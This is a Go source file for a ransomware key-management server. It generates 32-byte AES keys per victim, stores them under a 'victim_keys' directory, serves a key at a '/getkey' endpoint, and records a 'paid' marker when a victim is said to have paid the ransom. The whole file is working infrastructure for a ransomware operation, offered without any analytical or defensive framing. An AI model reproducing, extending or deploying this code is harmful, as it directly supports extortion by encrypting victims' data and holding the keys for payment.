package main

import (
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/joho/godotenv"
)

const keyDirectory = "victim_keys"
const keyFile = "victims.key"

var rootDirectory string

var ProjectName string

func main() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file, make sure a .env file is in the root directory of the project.")
	}

	ProjectName = os.Getenv("PROJECT_NAME")

	address := os.Getenv("IP_ADDRESS")
	port := os.Getenv("PORT")

	rootDirectory, err = os.Getwd()
	if err != nil {
		log.Fatal("Error getting root directory")
		return
	}

	http.HandleFunc("/createkey", createkey)
	http.HandleFunc("/getkey", getKey)

	fmt.Println("Listening on " + address + ":" + port)
	log.Fatal(http.ListenAndServe(address+":"+port, nil))
}

func getKey(w http.ResponseWriter, r *http.Request) {
	err := backToRoot()
	if err != nil {
		return
	}

	targetDir := strings.Split(r.Host, ":")[0]

	// change directory to victim_keys and the directory of the victim to store the key.
	err = changeDir(targetDir)
	if err != nil {
		return
	}

	// open the key file
	file, err := os.Open(keyFile)
	if err != nil {
		http.Error(w, "Error opening file", http.StatusInternalServerError)
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// read key from file
	key, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "Error reading file", http.StatusInternalServerError)
		fmt.Println("Error reading file:", err)
		return
	}

	// send key to client
	_, err = w.Write(key)
	if err != nil {
		http.Error(w, "Error writing response", http.StatusInternalServerError)
		fmt.Println("Error writing response:", err)
		return
	}

	// create file to indicate that the ransom has been paid
	file, err = os.Create("paid")
	if err != nil {
		fmt.Println("Error creating paid file:", err)
		return
	}
	defer file.Close()

	err = backToRoot()
	if err != nil {
		return
	}
	fmt.Println(strings.Split(r.Host, ":")[0] + " has paid ransom, therefore the key has been sent.")
}

func createkey(w http.ResponseWriter, r *http.Request) {
	err := backToRoot()
	if err != nil {
		return
	}

	// generate AES key
	key := make([]byte, 32)
	_, err = rand.Read(key)
	if err != nil {
		fmt.Println("Error generating AES key:", err)
		return
	}

	dirForHost := strings.Split(r.Host, ":")[0]

	// change directory to victim_keys and the directory of the victim to store the key.
	err = changeDir(dirForHost)
	if err != nil {
		return
	}

	// create file
	file, err := os.Create(keyFile)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// write key to file
	_, err = io.WriteString(file, string(key))
	if err != nil {
		http.Error(w, "Error writing to file", http.StatusInternalServerError)
		fmt.Println("Error writing to file:", err)
		return
	}

	// change directory back to root
	err = backToRoot()
	if err != nil {
		return
	}

	// send key to client
	_, err = w.Write(key)
	if err != nil {
		http.Error(w, "Error writing response", http.StatusInternalServerError)
		fmt.Println("Error writing response:", err)
		return
	}
}

func changeDir(targetDir string) error {

	// check if directory exists, if not create it
	_, err := os.Stat(keyDirectory)
	if err != nil {
		err = os.Mkdir(keyDirectory, 0755)
		if err != nil {
			return fmt.Errorf("error creating directory for victim_keys: %w", err)
		}
	}

	// change directory to victim_keys
	err = os.Chdir(keyDirectory)
	if err != nil {
		return fmt.Errorf("error changing directory to victim_keys: %w", err)
	}

	// check if directory exists, if not create it
	_, err = os.Stat(targetDir)
	if err != nil {
		err = os.Mkdir(targetDir, 0755)
		if err != nil {
			return fmt.Errorf("error creating directory for victim: %w", err)
		}
	}

	// change directory to victim IP name as directory name
	err = os.Chdir(targetDir)
	if err != nil {
		return fmt.Errorf("error changing directory to victim directory: %w", err)
	}
	return nil
}

func backToRoot() error {
	err := os.Chdir(rootDirectory)
	if err != nil {
		return fmt.Errorf("error changing directory back to root: %w", err)
	}
	return nil
}
